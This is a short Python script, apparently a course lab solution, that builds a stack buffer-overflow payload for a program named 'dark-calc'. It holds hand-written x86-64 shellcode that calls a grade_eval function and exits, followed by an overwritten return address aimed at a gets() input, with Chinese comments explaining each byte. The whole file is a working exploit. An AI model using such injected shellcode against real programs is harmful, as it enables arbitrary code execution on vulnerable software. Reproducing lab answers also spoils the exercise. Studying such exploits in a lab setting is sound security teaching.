#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc (print grade_eval(4))."""
import sys

# ---- 24 字节机器码 -------------------------------------------------------
sc  = b"\x48\x81\xec\x00\x02\x00\x00"   # sub  rsp, 0x200        栈下沉 512，让出代码区
sc += b"\x6a\x04\x5f"                   # push 4; pop rdi        rdi = 4  <- grade_eval 的参数
sc += b"\xb8\x87\x1a\x40\x00"           # mov  eax, 0x401a87     grade_eval 的地址
sc += b"\xff\xd0"                       # call rax
sc += b"\x31\xff\x6a\x3c\x58\x0f\x05"   # xor edi,edi; push 0x3c; pop rax; syscall  -> exit(0)

# ---- 三段拼装 -----------------------------------------------------------
payload  = sc                            # 偏移 0..23    机器码（ret 跳到这里）
payload += b"\xd0\x0f\x80\x00\x10\x72\x00\x00"   # 偏移 24..31  0x721000800fd0 (little-endian)
payload += b"\n"                         # 给 gets 收尾

sys.stdout.buffer.write(payload)
